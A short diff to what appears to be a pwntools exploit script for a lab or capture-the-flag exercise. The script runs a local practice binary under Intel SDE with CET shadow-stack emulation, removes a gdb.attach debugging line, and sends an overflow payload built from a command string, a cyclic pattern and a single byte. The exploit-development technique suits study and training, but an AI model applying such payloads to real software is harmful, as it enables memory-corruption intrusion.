@@ -2,7 +2,6 @@
 from pwn import *
 
 target = process("./sdekit/sde64 -no-follow-child -cet -cet_output_file /dev/null -- ./bin/ex1", shell=True)
-gdb.attach(target)
 
 payload = b'PRINT\0' + cyclic(18) + b'\x90'
 target.send(payload)
